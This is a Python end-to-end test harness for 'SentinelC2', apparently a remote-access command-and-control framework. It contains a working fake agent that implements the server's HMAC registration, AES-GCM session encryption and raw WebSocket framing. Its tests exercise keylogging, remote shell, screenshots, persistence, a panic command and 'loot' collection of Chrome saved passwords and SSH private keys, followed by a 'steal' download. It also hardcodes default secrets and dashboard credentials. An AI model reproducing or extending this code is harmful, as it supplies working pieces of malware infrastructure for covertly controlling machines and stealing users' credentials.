#!/usr/bin/env python
"""
SentinelC2 End-to-End Test Harness
===================================
Simulates a real agent connecting to the C2 server and drives the REST
dashboard API to verify every feature in one automated sweep.

Usage:
    python tests/e2e_harness.py           # assumes server already running
    python tests/e2e_harness.py --start     # launches c2_server, runs tests, kills it

Dependencies:
    pip install websockets requests cryptography
"""

import asyncio
import sys
import os
import json
import hashlib
import hmac
import base64
import struct
import time
import pathlib
import subprocess
import argparse

import requests
import websockets
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# --------------------------------------------------------------------------
# CONFIG
# --------------------------------------------------------------------------
ROOT = pathlib.Path(__file__).resolve().parent.parent
AGENT_PORT = 8443
HTTP_PORT = 8080
HOST = "127.0.0.1"
# Engagement creds come from the environment so rotating them never
# requires editing this file (defaults match the repo's dev constants).
import os as _os
SECRET = _os.environ.get("SENTINEL_SECRET", "sentinel-engagement-q4-2026-echo-tango-whiskey")
WEB_AUTH = (_os.environ.get("SENTINEL_WEB_USER", "operator"),
            _os.environ.get("SENTINEL_WEB_PASS", "S3nt1n3l-C2-D3v-Only-CHANGEME"))
AAD_DIR_S2A = b"\x00"
AAD_DIR_A2S = b"\x01"
SERVER_EXE = ROOT / "build" / "c2_server.exe"


# --------------------------------------------------------------------------
# CRYPTO HELPERS (match c2_server.nim + nimcrypto)
# --------------------------------------------------------------------------
def session_key(server_nonce: bytes, agent_nonce: bytes) -> bytes:
    """deriveSessionKey: HMAC-SHA256(secret, sn || an)"""
    return hmac.new(
        SECRET.encode(), server_nonce + agent_nonce, hashlib.sha256
    ).digest()[:32]


def make_nonce(ctr: int, rand8: bytes) -> bytes:
    return struct.pack(">I", ctr & 0xFFFFFFFF) + rand8  # 4 + 8 = 12


def aes_encrypt(key: bytes, nonce: bytes, aad: bytes, plain: bytes) -> bytes:
    """AES-256-GCM encrypt. Returns nonce || ciphertext || tag."""
    aesgcm = AESGCM(key)
    ct_tag = aesgcm.encrypt(nonce, plain, aad)
    return ct_tag


def aes_decrypt(key: bytes, nonce: bytes, aad: bytes, ct_tag: bytes) -> bytes:
    """AES-256-GCM decrypt. Returns plaintext or raises on failure."""
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ct_tag, aad)


# --------------------------------------------------------------------------
# RAW WEBSOCKET CLIENT (manual frame I/O - avoids UTF-8 validation)
# --------------------------------------------------------------------------
# The c2_server sends binary payloads inside TEXT frames (FC 0x81). The
# `websockets` library rejects non-UTF-8 text frames, so we hand-roll the
# WebSocket handshake + read/write loop on a raw asyncio TCP socket.


def ws_accept_key(client_key: str) -> str:
    # RFC 6455: base64(sha1(key + GUID))
    guid = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    digest = hashlib.sha1((client_key + guid).encode()).digest()
    return base64.b64encode(digest).decode()


async def _recv_exact(reader, n: int) -> bytes:
    """Read exactly n bytes; returns b'' on EOF/closure."""
    buf = b""
    while len(buf) < n:
        chunk = await reader.read(n - len(buf))
        if not chunk:
            return b""
        buf += chunk
    return buf


async def _read_ws_frame(reader) -> bytes | None:
    """Read one WebSocket frame's payload (binary), handling FIN/opcode."""
    hdr = await _recv_exact(reader, 2)
    if not hdr or len(hdr) < 2:
        return None
    b0, b1 = hdr[0], hdr[1]
    op = b0 & 0x0F
    masked = bool(b1 & 0x80)
    plen = b1 & 0x7F
    if plen == 126:
        ext = await _recv_exact(reader, 2)
        if not ext:
            return None
        plen = struct.unpack(">H", ext)[0]
    elif plen == 127:
        ext = await _recv_exact(reader, 8)
        if not ext:
            return None
        plen = struct.unpack(">Q", ext)[0]
    mask = b""
    if masked:
        mask = await _recv_exact(reader, 4)
        if not mask:
            return None
    payload = await _recv_exact(reader, plen)
    if len(payload) != plen:
        return None
    if masked:
        payload = bytes(payload[i] ^ mask[i & 3] for i in range(plen))
    # Handle opcodes: 0x8 close, 0x9 ping -> respond pong, 0xA pong.
    if op == 0x8:  # close
        return None
    if op == 0x9:  # ping -> send pong back via writer (caller must handle)
        # Best-effort: we just ignore pings here; the server rarely sends.
        return await _read_ws_frame(reader)
    return payload


async def _send_ws_frame(writer, payload: bytes, opcode: int = 0x01):
    """Send a WebSocket frame with the given payload. Server expects
    clients to mask their frames, so we always mask (RFC 6455)."""
    mask_bit = 0x80
    b0 = 0x80 | (opcode & 0x0F)  # FIN set + opcode
    out = bytes([b0])
    L = len(payload)
    if L < 126:
        out += bytes([mask_bit | L])
    elif L < 65536:
        out += bytes([mask_bit | 126]) + struct.pack(">H", L)
    else:
        out += bytes([mask_bit | 127]) + struct.pack(">Q", L)
    mask = os.urandom(4)
    out += mask
    masked = bytes(payload[i] ^ mask[i & 3] for i in range(L))
    writer.write(out + masked)


async def _ws_handshake(host: str, port: int) -> tuple:
    """Open a TCP socket, perform WS upgrade handshake.
    Returns (reader, writer, leftover_bytes) where leftover contains any
    frame data that arrived after the HTTP headers in the same TCP packet.
    """
    reader, writer = await asyncio.open_connection(host, port)
    client_key = base64.b64encode(os.urandom(16)).decode()
    req = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {client_key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n\r\n"
    )
    writer.write(req.encode())
    await writer.drain()
    # Read response headers, keeping any frame bytes that arrived after
    # the \r\n\r\n terminator in the same recv() chunk.
    headers = b""
    while b"\r\n\r\n" not in headers:
        chunk = await reader.read(4096)
        if not chunk:
            raise ConnectionError("WS handshake: EOF before headers")
        headers += chunk
        if len(headers) > 8192:
            raise ConnectionError("WS handshake: response too large")
    status_line = headers.split(b"\r\n", 1)[0].decode("ascii", "replace")
    if "101" not in status_line:
        raise ConnectionError(f"WS handshake failed: {status_line}")
    # Preserve the payload that may have been co-read with the headers.
    leftover = headers.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in headers else b""
    return reader, writer, leftover


# A tiny pre-read buffer for the fake agent so we don't lose frame bytes
# that arrived concatenated with the WS handshake HTTP response.
class _BufferedReader:
    def __init__(self, reader, prebuf: bytes = b""):
        self._r = reader
        self._buf = bytearray(prebuf)

    async def read(self, n: int) -> bytes:
        if self._buf:
            take = self._buf[:n]
            self._buf = self._buf[n:]
            return bytes(take)
        return await self._r.read(n)


# --------------------------------------------------------------------------
# FAKE AGENT (raw socket, no `websockets` library)
# --------------------------------------------------------------------------
class FakeAgent:
    def __init__(self, hostname="TESTBOX", os_info="Windows 11 Pro",
                 username="operator", is_admin=True):
        self.agent_id = ""
        self.key: bytes = b""
        self.send_ctr: int = 0
        self._reader = None
        self._writer = None
        self.info = {
            "h": hostname,
            "o": os_info,
            "u": username,
            "p": "admin" if is_admin else "user",
            "i": os.getpid(),
        }

    async def connect(self):
        reader, writer, leftover = await _ws_handshake(HOST, AGENT_PORT)
        self._writer = writer
        self._reader = _BufferedReader(reader, leftover)

        # Step 1 -- Registration (plaintext frame)
        agent_nonce = os.urandom(16)
        payload = json.dumps(self.info, separators=(',', ':'))
        sig = hmac.new(
            SECRET.encode(), payload.encode(), hashlib.sha256
        ).hexdigest().upper()  # nimcrypto toHex is uppercase by default
        reg_frame = json.dumps({
            "p": payload,
            "h": sig,
            "an": base64.b64encode(agent_nonce).decode(),
        })
        await _send_ws_frame(self._writer, reg_frame.encode("utf-8"))

        raw = await _read_ws_frame(self._reader)
        if raw is None:
            raise ConnectionError("No registration reply")
        ack = json.loads(raw.decode("utf-8"))
        assert ack.get("status") == "registered", (
            f"Registration rejected: {ack}"
        )
        self.agent_id = ack["agent_id"]
        sn_hex = ack["sn"]
        server_nonce = bytes.fromhex(sn_hex)

        self.key = session_key(server_nonce, agent_nonce)
        self.send_ctr = 0
        return self.agent_id

    def _encrypt(self, plain: str) -> bytes:
        rand8 = os.urandom(8)
        nonce = make_nonce(self.send_ctr, rand8)
        self.send_ctr += 1
        aad = self.agent_id.encode() + AAD_DIR_A2S
        ct_tag = aes_encrypt(self.key, nonce, aad, plain.encode("utf-8"))
        return nonce + ct_tag

    async def recv_frame(self, timeout_s: float = 10) -> dict:
        try:
            frame = await asyncio.wait_for(
                _read_ws_frame(self._reader), timeout=timeout_s
            )
        except asyncio.TimeoutError:
            return None
        if frame is None or len(frame) < 28:
            return None
        nonce = frame[:12]
        ct_tag = frame[12:]
        # Receiving from server -> AAD uses S2A direction (0x00)
        aad = self.agent_id.encode() + AAD_DIR_S2A
        try:
            plain = aes_decrypt(self.key, nonce, aad, ct_tag)
        except Exception:
            return None
        try:
            return json.loads(plain.decode("utf-8"))
        except Exception:
            return None

    async def send_output(self, text: str):
        msg = json.dumps({"type": "output", "data": text})
        await _send_ws_frame(self._writer, self._encrypt(msg))

    async def send_file_chunk(self, path: str, chunk_num: int, total: int,
                              data_b64: str, last: bool = False):
        # Server expects fields: filepath, chunk_index, total_chunks,
        # last_chunk, data (matching real agent's file_chunk format).
        msg = json.dumps({
            "type": "file_chunk",
            "filepath": path,
            "chunk_index": chunk_num,
            "total_chunks": total,
            "last_chunk": last or (chunk_num == total - 1),
            "data": data_b64,
        })
        await _send_ws_frame(self._writer, self._encrypt(msg))

    async def send_loot(self, kind: str, path: str, label: str,
                        size: int, preview: str = ""):
        msg = json.dumps({
            "type": "loot",
            "kind": kind,
            "path": path,
            "short": label,
            "size": size,
            "preview": preview,
        })
        await _send_ws_frame(self._writer, self._encrypt(msg))

    async def send_ps(self, rows: list):
        msg = json.dumps({"type": "ps", "data": rows})
        await _send_ws_frame(self._writer, self._encrypt(msg))

    async def close(self):
        if self._writer:
            try:
                self._writer.close()
                await self._writer.wait_closed()
            except Exception:
                pass


# --------------------------------------------------------------------------
# DASHBOARD REST CLIENT
# --------------------------------------------------------------------------
class DashClient:
    def __init__(self):
        self.base = f"http://{HOST}:{HTTP_PORT}"
        self.ses = requests.Session()
        self.ses.auth = WEB_AUTH

    def _get(self, path, **kw):
        return self.ses.get(self.base + path, timeout=10, **kw)

    def _post(self, path, **kw):
        return self.ses.post(self.base + path, timeout=10, **kw)

    def agents_raw(self) -> list:
        """Return the raw /api/agents response (with uptime)."""
        return self._get("/api/agents").json()

    def agents(self) -> list:
        """Return just the agent list."""
        r = self._get("/api/agents").json()
        # Server wraps as {agents: [...], uptime_s: N}
        if isinstance(r, dict) and "agents" in r:
            return r["agents"]
        return r  # be defensive

    def state(self, aid: str):
        return self._get(f"/api/state/{aid}", params={}).json()

    def files(self, aid: str) -> list:
        r = self._get(f"/api/files/{aid}").json()
        if isinstance(r, dict) and "files" in r:
            return r["files"]
        return r

    def log_text(self, aid: str) -> str:
        r = self._get(f"/api/log/{aid}").json()
        if isinstance(r, dict) and "text" in r:
            return r["text"]
        return r if isinstance(r, str) else ""

    def loot(self, aid: str) -> list:
        r = self._get(f"/api/loot/{aid}").json()
        if isinstance(r, dict) and "items" in r:
            return r["items"]
        return r

    def cmd(self, aid: str, command: str, args: str = ""):
        r = self._post("/api/cmd", json={
            "id": aid, "cmd": command, "args": args,
        })
        return r.json()

    def upload(self, aid: str, remote_path: str, data: bytes):
        chunk_size = 512 * 1024
        chunks = []
        for i in range(0, len(data), chunk_size):
            chunks.append(base64.b64encode(
                data[i:i + chunk_size]).decode())
        total = len(chunks)
        for idx, b64 in enumerate(chunks):
            r = self._post("/api/upload", json={
                "id": aid,
                "path": remote_path,
                "data_b64": b64,
                "chunk_num": idx,
                "final": idx == total - 1,
            })
            assert r.status_code == 200, (
                f"Upload chunk {idx} failed: {r.text}"
            )


# --------------------------------------------------------------------------
# TEST RUNNER
# --------------------------------------------------------------------------
class TestRunner:
    def __init__(self):
        self.passed = 0
        self.failed = 0

    def ok(self, msg: str):
        self.passed += 1
        print(f"  PASS  {msg}")

    def fail(self, msg: str, detail: str = ""):
        self.failed += 1
        extra = f" -- {detail}" if detail else ""
        print(f"  FAIL  {msg}{extra}")

    def check(self, name: str, condition: bool, detail: str = ""):
        if condition:
            self.ok(name)
        else:
            self.fail(name, detail)

    def summary(self) -> bool:
        print(f"\n{'=' * 52}")
        print(f"  PASSED: {self.passed}   |   FAILED: {self.failed}")
        print(f"{'=' * 52}")
        return self.failed == 0


# --------------------------------------------------------------------------
# TESTS
# --------------------------------------------------------------------------
async def test_rest_endpoints(t: TestRunner, rest: DashClient, agent_id: str):
    print("\n--- REST Endpoints ---")
    agents = rest.agents()
    t.check("/api/agents is a list", isinstance(agents, list))
    t.check(f"Agent {agent_id} present",
            any(a["id"] == agent_id for a in agents))
    agent = next((a for a in agents if a["id"] == agent_id), {})
    t.check("agent has 'remote' field", "remote" in agent)
    t.check("agent has 'geo' field", "geo" in agent)

    state = rest.state(agent_id)
    t.check("/api/state/<id> returns dict", isinstance(state, dict))

    log = rest.log_text(agent_id)
    t.check("/api/log/<id> non-trivial", len(log) > 0,
            f"len={len(log)}")

    files = rest.files(agent_id)
    t.check("/api/files/<id> returns list", isinstance(files, list))

    loot = rest.loot(agent_id)
    t.check("/api/loot/<id> returns list", isinstance(loot, list))


async def test_command_dispatch(t: TestRunner, rest: DashClient, agent: FakeAgent):
    print("\n--- Command Dispatch ---")
    rest.cmd(agent.agent_id, "keys", "start")
    await asyncio.sleep(0.4)
    cmd = await agent.recv_frame(timeout_s=3)
    t.check("keys start delivered", cmd is not None)
    if cmd:
        t.check("cmd == keys", cmd.get("cmd") == "keys", str(cmd))
        t.check("args == start", cmd.get("args") == "start", str(cmd))
        await agent.send_output("[keylog] admin typed: notepad.exe")
        await asyncio.sleep(0.5)
        log = rest.log_text(agent.agent_id)
        t.check("log contains keylog", "[keylog]" in log)

    rest.cmd(agent.agent_id, "shell", "whoami")
    await asyncio.sleep(0.4)
    cmd2 = await agent.recv_frame(timeout_s=3)
    if cmd2:
        t.check("shell delivered", cmd2.get("cmd") == "shell")


async def test_file_chunks(t: TestRunner, rest: DashClient, agent: FakeAgent):
    print("\n--- File Chunks ---")
    rest.cmd(agent.agent_id, "screenshot", "")
    await asyncio.sleep(0.4)
    cmd = await agent.recv_frame(timeout_s=3)
    t.check("screenshot cmd delivered", cmd is not None)

    data = os.urandom(128)
    b64 = base64.b64encode(data).decode()
    for i in range(3):
        await agent.send_file_chunk("screenshot.bmp", i, 3, b64)
    await asyncio.sleep(0.6)

    files = rest.files(agent.agent_id)
    names = [f.get("name", "") for f in files]
    t.check("screenshot.bmp in files",
            any("screenshot" in n.lower() or "scrsh" in n.lower()
                for n in names),
            f"names={names}")


async def test_toggles(t: TestRunner, rest: DashClient, agent: FakeAgent):
    print("\n--- Toggles ---")
    for state in ("start", "stop"):
        rest.cmd(agent.agent_id, "keys", state)
        await asyncio.sleep(0.4)
        cmd = await agent.recv_frame(timeout_s=3)
        t.check(f"keys {state} delivered", cmd is not None)
        if cmd:
            await agent.send_output(f"[keys] toggled {state}")
    await asyncio.sleep(0.3)


async def test_upload_operator_to_agent(t: TestRunner, rest: DashClient, agent: FakeAgent):
    print("\n--- Upload ---")
    payload = b"print('test')" * 1000
    rest.upload(agent.agent_id, "scripts/tool.py", payload)
    await asyncio.sleep(1.0)
    cmd = await agent.recv_frame(timeout_s=3)
    t.check("upload command(s) received by agent",
            cmd is not None,
            str(cmd)[:80] if cmd else "no cmd")


async def test_loot_and_autodrive(t: TestRunner, rest: DashClient, agent: FakeAgent):
    print("\n--- Autodrive + Loot ---")
    rest.cmd(agent.agent_id, "autodrive", "start")
    await asyncio.sleep(0.4)
    cmd = await agent.recv_frame(timeout_s=3)
    t.check("autodrive start delivered", cmd is not None)

    # Fake agent discovers loot
    await agent.send_loot("browser",
                          "C:/Users/test/AppData/...Chrome/Login Data",
                          "Chrome Passwords", 31027, preview="stores 12 creds")
    await agent.send_loot("ssh",
                          "C:/Users/test/.ssh/id_rsa",
                          "SSH Key", 2456)
    await asyncio.sleep(0.4)

    loot = rest.loot(agent.agent_id)
    t.check(f"Loot items ({len(loot)})", len(loot) >= 2)

    if loot:
        # Steal one
        rest.cmd(agent.agent_id, "download", loot[0]["path"])
        await asyncio.sleep(0.4)
        cmd = await agent.recv_frame(timeout_s=3)
        if cmd:
            t.check("steal = download queued", "download" == cmd.get("cmd"))

    rest.cmd(agent.agent_id, "autodrive", "stop")
    await asyncio.sleep(0.4)
    cmd = await agent.recv_frame(timeout_s=3)
    t.check("autodrive stop delivered", cmd is not None)


async def test_panic_persist_ps(t: TestRunner, rest: DashClient, agent: FakeAgent):
    print("\n--- Panic, Persist, PS ---")
    for cmd_name in ("panic", "persist", "ps"):
        rest.cmd(agent.agent_id, cmd_name, "")
        await asyncio.sleep(0.4)
        raw = await agent.recv_frame(timeout_s=3)
        t.check(f"{cmd_name} delivered", raw is not None)
        if raw and cmd_name == "ps":
            await agent.send_ps([{"Name": "explorer.exe", "PID": 1234}])
    await asyncio.sleep(0.5)


# --------------------------------------------------------------------------
# MAIN
# --------------------------------------------------------------------------
async def run_tests(start_server: bool):
    server_proc = None
    try:
        if start_server:
            print(f"[*] Starting {SERVER_EXE} ...")
            server_proc = subprocess.Popen(
                [str(SERVER_EXE)], cwd=str(ROOT),
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2.5)

        # Quick health-check
        try:
            r = requests.get(f"http://{HOST}:{HTTP_PORT}/",
                             auth=WEB_AUTH, timeout=5)
            print(f"[*] Dashboard HTTP {r.status_code}")
        except Exception:
            print("[*] Dashboard not reachable yet - continuing")

        t = TestRunner()

        print(f"\n{'#' * 52}")
        print("#  SentinelC2 E2E Test Suite")
        print(f"{'#' * 52}")

        agent = FakeAgent("E2E-VICTIM", "Windows 11 Enterprise", "target", False)
        aid = await agent.connect()
        print(f"\n[+] Agent registered as {aid}")
        t.ok(f"Agent register ({aid})")
        await asyncio.sleep(2.5)  # wait for geo lookup

        rest = DashClient()

        await test_rest_endpoints(t, rest, aid)
        await test_command_dispatch(t, rest, agent)
        await test_file_chunks(t, rest, agent)
        await test_toggles(t, rest, agent)
        await test_upload_operator_to_agent(t, rest, agent)
        await test_loot_and_autodrive(t, rest, agent)
        await test_panic_persist_ps(t, rest, agent)

        await agent.close()
        all_ok = t.summary()
        return 0 if all_ok else 1

    finally:
        if server_proc:
            print("[*] Stopping server...")
            server_proc.terminate()
            try:
                server_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                server_proc.kill()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--start", action="store_true",
                        help="Start c2_server, run tests, then kill it")
    args = parser.parse_args()
    sys.exit(asyncio.run(run_tests(start_server=args.start)))
